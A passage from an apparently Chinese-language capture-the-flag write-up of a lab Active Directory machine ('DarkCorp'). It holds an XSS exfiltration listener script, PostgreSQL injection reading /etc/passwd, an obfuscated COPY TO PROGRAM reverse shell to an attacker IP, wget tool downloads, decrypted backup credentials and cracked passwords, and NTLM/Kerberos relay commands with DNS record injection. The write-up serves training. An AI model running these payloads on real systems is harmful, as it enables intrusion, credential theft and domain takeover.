class="string">'session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNGFhNWFlNjRmMmQ4YWJkNTFjN2U4ZWEyODhmNjdiNzQ2MmIyNjY0YSJ9.Z6mM1Q.SGDZnbTJ7f5miJxHruNLwjD_fhI'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to send the POST request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_post</span><span class="params">()</span>:</span></span><br><span class="line">    response = requests.post(TARGET_URL, data=post_data, headers=headers)</span><br><span class="line">    print(<span class="string">f"[+] POST Request Sent! Status Code: <span class="subst">&#123;response.status_code&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom HTTP request handler to capture and decode the incoming data</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'/c='</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            encoded_data = self.path.split(<span class="string">'/c='</span>)[<span class="number">1</span>]</span><br><span class="line">            decoded_data = base64.b64decode(encoded_data).decode(<span class="string">'latin-1'</span>)</span><br><span class="line">            <span class="comment"># print(f"[+] Received data &#123;decoded_data&#125;")</span></span><br><span class="line">            tree = html.fromstring(decoded_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># XPath query to find the div with id 'messagebody'</span></span><br><span class="line">            message_body = tree.xpath(<span class="string">'//div[@id="messagebody"]'</span>)</span><br><span class="line">           </span><br><span class="line">            <span class="comment"># Check if the div exists and extract the content</span></span><br><span class="line">            <span class="keyword">if</span> message_body:</span><br><span class="line">                <span class="comment"># Extract inner text, preserving line breaks</span></span><br><span class="line">                message_text = message_body[<span class="number">0</span>].text_content().strip()</span><br><span class="line">                print(<span class="string">"[+] Extracted Message Body Content:\n"</span>)</span><br><span class="line">                print(message_text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"[!] No div with id 'messagebody' found."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"[!] Received request but no data found."</span>)</span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b'OK'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log_message</span><span class="params">(self, format, *args)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>  <span class="comment"># Suppress default logging</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to start the HTTP server</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_server</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = (LISTEN_IP, LISTEN_PORT)</span><br><span class="line">    httpd = HTTPServer(server_address, RequestHandler)</span><br><span class="line">    print(<span class="string">f"[+] Listening on port <span class="subst">&#123;LISTEN_PORT&#125;</span> for exfiltrated data..."</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the HTTP server in a separate thread</span></span><br><span class="line">server_thread = threading.Thread(target=start_server)</span><br><span class="line">server_thread.daemon = <span class="keyword">True</span></span><br><span class="line">server_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the POST request</span></span><br><span class="line">send_post()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep the main thread alive to continue listening</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    print(<span class="string">"\n[+] Stopping server."</span>)</span><br></pre></td></tr></table></figure>

<h1 id="dev-a3f1-01"><a href="#dev-a3f1-01" class="headerlink" title="dev-a3f1-01"></a>dev-a3f1-01</h1><p>测试搜索功能，随意输入得到报错，可以看到sql语句使用了我们的输入，可能存在sql注入：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021012.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>验证存在注入,并且可以识别出是PostgreSQL：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'aaa' or 1=1</span><br><span class="line">'aaa' or 1=2</span><br><span class="line"></span><br><span class="line">'aaa';<span class="keyword">SELECT</span> <span class="keyword">version</span>()<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021013.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>并且可以直接使用一些pg函数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''; SELECT pg_read_file('/etc/passwd', 0, 1000);</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021014.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="sql-to-rce"><a href="#sql-to-rce" class="headerlink" title="sql to rce"></a>sql to rce</h2><p>pg可以直接执行命令，存在一些过滤，编码绕回即可：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">'';<span class="keyword">DO</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    c <span class="built_in">text</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    c := <span class="keyword">CHR</span>(<span class="number">67</span>) || <span class="keyword">CHR</span>(<span class="number">79</span>) || <span class="keyword">CHR</span>(<span class="number">80</span>) || <span class="keyword">CHR</span>(<span class="number">89</span>) || <span class="string">' (SELECT '''') to program ''bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1"'''</span>;</span><br><span class="line">    <span class="keyword">EXECUTE</span> c;</span><br><span class="line"><span class="keyword">END</span> $$;</span><br></pre></td></tr></table></figure>

<p>打到postgres shell：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021015.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="postgres"><a href="#postgres" class="headerlink" title="postgres"></a>postgres</h1><p>常规翻文件，在dashboard的env里得到数据库账号密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">postgres@drip:/var/www/html/dashboard$ cat .env</span><br><span class="line"></span><br><span class="line">DB_ENGINE=postgresql</span><br><span class="line">DB_HOST=localhost</span><br><span class="line">DB_NAME=dripmail</span><br><span class="line">DB_USERNAME=dripmail_dba</span><br><span class="line">DB_PASS=2Qa2SsBkQvsc</span><br><span class="line">DB_PORT=5432</span><br></pre></td></tr></table></figure>

<p>另外在backups里发现postgres相关的gpg加密备份：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021016.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gpg"><a href="#gpg" class="headerlink" title="gpg"></a>gpg</h2><p>gpg解密，密码就是DB_PASS：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line"></span><br><span class="line">gpg --use-agent --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback  --passphrase 2Qa2SsBkQvsc --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg  &gt; dev-dripmail.old.sql</span><br><span class="line"></span><br><span class="line">1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb</span><br><span class="line">2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb</span><br><span class="line">3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021017.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>sql中得到一些hash，可以解出victor.r和ebelford的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb</span><br><span class="line">2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb</span><br><span class="line">3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb</span><br><span class="line"></span><br><span class="line">victor.r victor1gustavo@#</span><br><span class="line">ebelford ThePlague61780</span><br></pre></td></tr></table></figure>

<h1 id="ebelford"><a href="#ebelford" class="headerlink" title="ebelford"></a>ebelford</h1><p>得到的ebelford账号密码ssh登录：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021018.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>查看hosts可以看到内网的域环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb</span><br><span class="line">172.16.20.3 drip.darkcorp.htb</span><br></pre></td></tr></table></figure>

<p>打通隧道，添加hosts,可以发现前面得到的另一组账号密码是有效域用户：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh ebelford@10.10.11.54 -D 1080</span><br><span class="line"></span><br><span class="line">proxychains4 netexec smb DC-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshuttle直接打通也可以,但本地遇到bug，mac运行后没添加route，需要刷新防火墙规则，kali里正常</span></span><br><span class="line">sudo pfctl -f /etc/pf.conf</span><br><span class="line">sshuttle -v -r ebelford@10.10.11.54 172.16.20.1/24</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021019.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h1><p>收集bloodhound数据分析,但失败，先收集常规users：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-16m" bloodhound-python -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb -ns 172.16.20.1 --dns-tcp -c All --zip</span><br><span class="line"></span><br><span class="line">nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --users</span><br><span class="line"></span><br><span class="line">nxc ldap 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --bloodhound --collection All</span><br></pre></td></tr></table></figure>

<h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">victor.r</span><br><span class="line">svc_acc</span><br><span class="line">john.w</span><br><span class="line">angela.w</span><br><span class="line">angela.w.adm</span><br><span class="line">taylor.b</span><br><span class="line">taylor.b.adm</span><br><span class="line">eugene.b</span><br><span class="line">bryce.c</span><br></pre></td></tr></table></figure>



<h1 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h1><p>对发现的两个内网机器进行探测,直接传静态nmap上去更稳定：</p>
<ul>
<li>Release Nmap v7.91SVN · ernw/static-toolbox<br><a href="https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN" target="_blank" rel="noopener">https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.8:7777/nmap-7.91SVN-x86_64-portable.tar.gz</span><br><span class="line">tar -xf nmap-7.91SVN-x86_64-portable.tar.gz</span><br><span class="line"></span><br><span class="line">./run-nmap.sh -sC -sV 172.16.20.1 172.16.20.2</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91SVN ( https://nmap.org ) at 2025-02-10 18:48 MST</span><br><span class="line">Nmap scan report for DC-01 (172.16.20.1)</span><br><span class="line">Host is up (0.00091s latency).</span><br><span class="line">Not shown: 985 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)</span><br><span class="line">|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          nginx 1.22.1</span><br><span class="line">|_http-server-header: nginx/1.22.1</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 01:48:38Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp</span><br><span class="line">| Not valid before: 2025-01-22T12:09:55</span><br><span class="line">|_Not valid after:  2124-12-29T12:09:55</span><br><span class="line">|_ssl-date: 2025-02-11T01:49:57+00:00; 0s from scanner time.</span><br><span class="line">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| ssl-cert: Subject: commonName=DARKCORP-DC-01-CA</span><br><span class="line">| Not valid before: 2024-12-29T23:24:10</span><br><span class="line">|_Not valid after:  2034-12-29T23:34:10</span><br><span class="line">|_ssl-date: 2025-02-11T01:49:57+00:00; 0s from scanner time.</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp</span><br><span class="line">| Not valid before: 2025-01-22T12:09:55</span><br><span class="line">|_Not valid after:  2124-12-29T12:09:55</span><br><span class="line">|_ssl-date: 2025-02-11T01:49:57+00:00; 0s from scanner time.</span><br><span class="line">2179/tcp open  vmrdp?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp</span><br><span class="line">| Not valid before: 2025-01-22T12:09:55</span><br><span class="line">|_Not valid after:  2124-12-29T12:09:55</span><br><span class="line">|_ssl-date: 2025-02-11T01:49:57+00:00; 0s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp</span><br><span class="line">| Not valid before: 2025-01-22T12:09:55</span><br><span class="line">|_Not valid after:  2124-12-29T12:09:55</span><br><span class="line">|_ssl-date: 2025-02-11T01:49:57+00:00; 0s from scanner time.</span><br><span class="line">Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: DC-01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:15:5d:84:03:00 (Microsoft)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-02-11T01:49:17</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.20.2</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">5000/tcp open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-auth:</span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|   Negotiate</span><br><span class="line">|_  NTLM</span><br><span class="line">| http-ntlm-info:</span><br><span class="line">|   Target_Name: darkcorp</span><br><span class="line">|   NetBIOS_Domain_Name: darkcorp</span><br><span class="line">|   NetBIOS_Computer_Name: WEB-01</span><br><span class="line">|   DNS_Domain_Name: darkcorp.htb</span><br><span class="line">|   DNS_Computer_Name: WEB-01.darkcorp.htb</span><br><span class="line">|   DNS_Tree_Name: darkcorp.htb</span><br><span class="line">|_  Product_Version: 10.0.20348</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: WEB-01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:15:5d:84:03:03 (Microsoft)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-02-11T01:49:18</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Post-scan script results:</span><br><span class="line">| clock-skew:</span><br><span class="line">|   0s:</span><br><span class="line">|     172.16.20.1 (DC-01)</span><br><span class="line">|_    172.16.20.2</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 2 IP addresses (2 hosts up) scanned in 90.78 seconds</span><br></pre></td></tr></table></figure>

<h2 id="20-1"><a href="#20-1" class="headerlink" title="20.1"></a>20.1</h2><p>20.1的80就是主站，443是IIS默认页面：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021020.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="20-2"><a href="#20-2" class="headerlink" title="20.2"></a>20.2</h2><p>20.2的80是IIS默认页面，5000需要登录：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021021.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Internal-Status-Monitor"><a href="#Internal-Status-Monitor" class="headerlink" title="Internal Status Monitor"></a>Internal Status Monitor</h1><p>victor.r可以登录20.2的5000端口,因为是域用户，需要配置burp ntlm认证：</p>
<ul>
<li>Configuring NTLM with Burp Suite - PortSwigger<br><a href="https://portswigger.net/support/configuring-ntlm-with-burp-suite" target="_blank" rel="noopener">https://portswigger.net/support/configuring-ntlm-with-burp-suite</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victor.r victor1gustavo@#</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021022.jpg" alt=""></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021023.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="check"><a href="#check" class="headerlink" title="check"></a>check</h2><p>然后有个check功能,但对host有校验,不能直接修改为我们的ip：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021024.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021025.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>但可以发现对端口并没有限制：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021026.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>(这里也有个非预期的命令注入)</p>
<h2 id="svc-acc"><a href="#svc-acc" class="headerlink" title="svc_acc"></a>svc_acc</h2><p>所以接下来就类似Mist机器了，转发端口,再次check，发现是svc_acc：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.8:7777/socatx64.bin</span><br><span class="line"></span><br><span class="line">./socatx64.bin tcp-listen:8088,reuseaddr,fork tcp:10.10.14.8:80</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021027.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>破解不出来，接下来尝试relay,ldap交互shell，但并不能直接shadow creds。但可以看到svc_acc是dns admin：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/ntlmrelayx.py -t ldap://dc-01.darkcorp.htb -i</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> get_user_groups svc_acc</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021031.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Relay-time"><a href="#Relay-time" class="headerlink" title="Relay time"></a>Relay time</h1><p>整理信息，现在我们可以进行relay，并且是dns admin，那就可以通过relay添加dns，搜索可以发现用到dns的relay方式：</p>
<ul>
<li>Relaying Kerberos over SMB using krbrelayx<br><a href="https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx" target="_blank" rel="noopener">https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> relay添加dns</span></span><br><span class="line">python3 examples/ntlmrelayx.py -t "ldap://172.16.20.1" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.5</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置relay请求web01证书</span></span><br><span class="line">python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB01$'</span><br><span class="line"></span><br><span 